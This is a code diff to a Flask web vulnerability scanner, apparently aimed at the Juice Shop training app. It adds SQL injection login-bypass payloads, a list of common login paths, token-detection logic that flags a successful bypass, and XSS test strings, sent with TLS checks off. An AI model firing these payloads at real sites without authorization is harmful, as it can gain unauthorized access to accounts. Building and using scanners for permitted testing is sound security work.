@@ -21,9 +21,9 @@ def index():
 @app.route("/scan", methods=["POST"])
 def scan():
     try:
-        body = request.get_json()
+        body = request.get_json(silent=True)
 
-        if not body:
+        if not isinstance(body, dict):
             return jsonify({"error": "Invalid JSON"}), 400
 
         url = body.get("url", "").strip()
@@ -32,8 +32,7 @@ def scan():
         if not url:
             return jsonify({"error": "No URL provided"}), 400
 
-        if not url.startswith(("http://", "https://")):
-            url = "https://" + url
+        url = normalize_url(url)
 
         all_findings = []
         start_time = time.time()
@@ -52,7 +51,7 @@ def scan():
 
         for f in all_findings:
             sev = f.get("severity", "low")
-            severity_counts[sev] += 1
+            severity_counts[sev] = severity_counts.get(sev, 0) + 1
             type_counts[f["type"]] = type_counts.get(f["type"], 0) + 1
 
         return jsonify({
@@ -87,6 +86,14 @@ SQL_PAYLOADS =[
     "1' ORDER BY 1--",
 ]
 
+SQL_AUTH_PAYLOADS = [
+    "' OR 1=1--",
+    "' OR '1'='1'--",
+    "' OR '1'='1' --",
+    "admin@juice-sh.op'--",
+    "admin@juice-sh.op' OR 1=1--",
+]
+
 SQL_ERROR_PATTERNS = [
     r"you have an error in your sql syntax",
     r"warning: mysql",
@@ -99,6 +106,25 @@ SQL_ERROR_PATTERNS = [
     r"ora-\d{5}",
     r"postgresql.*error",
 ]
+
+SQL_LOGIN_ENDPOINTS = [
+    "/rest/user/login",
+    "/api/login",
+    "/login",
+    "/user/login",
+    "/users/login",
+    "/auth/login",
+]
+
+AUTH_SUCCESS_KEYS = {
+    "access_token",
+    "accessToken",
+    "authentication",
+    "auth",
+    "jwt",
+    "refresh_token",
+    "token",
+}
 # ─── XSS Configuration ───────────────────────────────────────────────────────
 XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
@@ -166,6 +192,128 @@ def extract_forms(url):
     return forms
 
 
+def submit_form(target, method, data):
+    if method == "get":
+        return requests.get(target, params=data, timeout=10, verify=False)
+    return requests.post(target, data=data, timeout=10, verify=False)
+
+
+def base_origin(url):
+    parsed = urllib.parse.urlsplit(url)
+    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, "", "", ""))
+
+
+def normalize_url(url):
+    if url.startswith(("http://", "https://")):
+        return url
+
+    parsed = urllib.parse.urlsplit("//" + url)
+    localhost_names = {"localhost", "127.0.0.1", "::1"}
+    scheme = "http" if parsed.hostname in localhost_names else "https"
+    return f"{scheme}://{url}"
+
+
+def contains_sql_error(response_text):
+    text = response_text.lower()
+    return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)
+
+
+def has_auth_success_key(value):
+    if isinstance(value, dict):
+        for key, nested in value.items():
+            if key in AUTH_SUCCESS_KEYS and nested not in (None, "", False):
+                return True
+            if has_auth_success_key(nested):
+                return True
+        return False
+    if isinstance(value, list):
+        return any(has_auth_success_key(item) for item in value)
+    return False
+
+
+def looks_like_auth_success(res):
+    if res.status_code not in (200, 201):
+        return False
+
+    try:
+        if has_auth_success_key(res.json()):
+            return True
+    except ValueError:
+        pass
+
+    text = res.text.lower()
+    success_markers = [
+        '"authentication"',
+        '"access_token"',
+        '"accesstoken"',
+        '"token"',
+        '"jwt"',
+        "login successful",
+        "logged in",
+        "bearer ",
+    ]
+    failure_markers = [
+        "invalid",
+        "incorrect",
+        "unauthorized",
+        "forbidden",
+        "failed",
+    ]
+    return any(marker in text for marker in success_markers) and not any(
+        marker in text for marker in failure_markers
+    )
+
+
+def check_sql_login_endpoints(url):
+    findings = []
+    origin = base_origin(url)
+    if not origin:
+        return findings
+
+    for path in SQL_LOGIN_ENDPOINTS:
+        target = urllib.parse.urljoin(origin + "/", path.lstrip("/"))
+
+        baseline_body = {
+            "email": "__vulnscan_invalid__@example.invalid",
+            "password": "__vulnscan_invalid__",
+        }
+
+        try:
+            baseline = requests.post(target, json=baseline_body, timeout=5, verify=False)
+        except Exception:
+            continue
+
+        baseline_success = looks_like_auth_success(baseline)
+
+        for payload in SQL_AUTH_PAYLOADS:
+            candidates = [
+                {"email": payload, "password": "anything"},
+                {"username": payload, "password": "anything"},
+            ]
+
+            for body in candidates:
+                try:
+                    res = requests.post(target, json=body, timeout=5, verify=False)
+                    if contains_sql_error(res.text) or (
+                        looks_like_auth_success(res) and not baseline_success
+                    ):
+                        findings.append({
+                            "type": "SQL Injection",
+                            "severity": "critical",
+                            "location": target,
+                            "payload": payload,
+                            "detail": "SQL injection authentication bypass pattern detected"
+                        })
+                        break
+                except Exception as e:
+                    print("SQL login check error:", e)
+
+            if findings and findings[-1]["location"] == target:
+                break
+
+    return findings
+
+
 def check_sql_injection(url):
     findings = []
     forms = extract_forms(url)
@@ -177,9 +325,9 @@ def check_sql_injection(url):
             data = {f["name"]: payload for f in form["inputs"]}
 
             try:
-                res = requests.post(target, data=data, timeout=10, verify=False)
+                res = submit_form(target, form["method"], data)
                 response_text = res.text.lower()
-                if any(re.search(pattern, response_text) for pattern in SQL_ERROR_PATTERNS):
+                if contains_sql_error(response_text):
                     findings.append({
                         "type": "SQL Injection",
                         "severity": "critical",
@@ -190,6 +338,7 @@ def check_sql_injection(url):
             except Exception as e:
                 print("SQL check error:", e)
 
+    findings += check_sql_login_endpoints(url)
     return findings
 
 
@@ -204,7 +353,7 @@ def check_xss(url):
             data = {f["name"]: payload for f in form["inputs"]}
 
             try:
-                res = requests.post(target, data=data, timeout=10, verify=False)
+                res = submit_form(target, form["method"], data)
                 if payload in res.text:
                     findings.append({
                         "type": "XSS",
